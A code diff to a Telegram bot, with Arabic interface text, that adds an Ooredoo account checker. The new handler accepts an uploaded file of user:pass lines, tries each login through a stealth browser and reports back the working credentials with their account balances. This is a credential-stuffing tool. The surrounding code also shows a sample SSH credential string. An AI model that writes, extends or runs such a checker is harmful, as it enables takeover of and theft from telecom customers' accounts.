@@ -14,6 +14,7 @@ from config import config
 from automation.browser import StealthBrowser
 from automation.sso_flow import run_sso_flow
 from automation.vmess import build_ssh_dark
+from automation.ooredoo import OoredooChecker
 
 log = get_logger("Handlers")
 
@@ -57,7 +58,7 @@ def is_admin(user_id: int) -> bool:
     return user_id == config.ADMIN_ID
 
 # ═══════════════════════════════════════════
-# الأوامر الأساسية (ضرورية باش main.py يخدم)
+# الأوامر الأساسية
 # ═══════════════════════════════════════════
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -139,7 +140,7 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await browser.close()
 
 # ═══════════════════════════════════════════
-# ADMIN
+# ADMIN & Ooredoo & SSH
 # ═══════════════════════════════════════════
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -161,6 +162,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "مثال:\n"
             "152.228.162.19:22@u1595199941:U6CqrexXyK"
         )
+    elif data == "admin_ooredoo":
+        context.user_data["await_ooredoo_file"] = True
+        await query.message.edit_text("📁 أرسل الملف الآن (TXT يحتوي على user:pass فـ كل سطر).")
     elif data == "admin_stats":
         await query.message.edit_text("📊 الإحصائيات مازال ما تبرمجتش.")
     elif data == "admin_users":
@@ -209,6 +213,72 @@ async def handle_ssh_conversion_input(update: Update, context: ContextTypes.DEFA
         await update.message.reply_document(document=bio, filename=filename)
     except Exception as e:
         await update.message.reply_text(f"❌ خطأ: {e}\nتأكد من الشكل: IP:Port@User:Pass")
+    return True
+
+async def process_ooredoo_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get("await_ooredoo_file"): return False
+        
+    context.user_data.pop("await_ooredoo_file", None)
+    file = update.message.document
+    
+    if not file or not file.file_name.endswith(".txt"):
+        await update.message.reply_text("❌ أرسل ملف TXT فقط.")
+        return True
+
+    msg = await update.message.reply_text("⏳ جاري تحميل الملف وبدء الفحص...")
+    
+    try:
+        file_obj = await file.get_file()
+        content = (await file_obj.download_as_bytearray()).decode("utf-8", errors="ignore")
+        lines = content.splitlines()
+        
+        browser = StealthBrowser()
+        ctx = await browser.start()
+        checker = OoredooChecker(ctx, update.effective_chat.id, context.bot)
+        
+        results = []
+        total = len(lines)
+        
+        for i, line in enumerate(lines):
+            line = line.strip()
+            if not line or ":" not in line: continue
+            
+            parts = line.split(":", 1)
+            user = parts[0].strip()
+            pwd = parts[1].strip()
+            
+            if i % 5 == 0:
+                try: await msg.edit_text(f"⏳ جاري الفحص... {i}/{total}")
+                except: pass
+                
+            res = await checker.check_account(user, pwd)
+            if res["success"] or res["balance"] != "فشل الدخول":
+                results.append(res)
+                
+            await asyncio.sleep(1)
+            
+        await checker.close()
+        await browser.close()
+        
+        if not results:
+            await msg.edit_text("❌ لم يتم العثور على أي حساب صالح.")
+            return True
+            
+        res_text = "📊 *نتائج سحب Ooredoo:*\n\n"
+        for r in results:
+            res_text += f"👤: `{r['user']}`\n🔑: `{r['pass']}`\n💰: *{r['balance']}*\n➖➖➖➖\n"
+            
+        if len(res_text) > 4000:
+            for x in range(0, len(res_text), 4000):
+                await context.bot.send_message(chat_id=update.effective_chat.id, text=res_text[x:x+4000], parse_mode="Markdown")
+        else:
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=res_text, parse_mode="Markdown")
+            
+        await msg.delete()
+        
+    except Exception as e:
+        await msg.edit_text(f"❌ خطأ: {e}")
+        
     return True
 
 async def handle_admin_input(update, context, text):
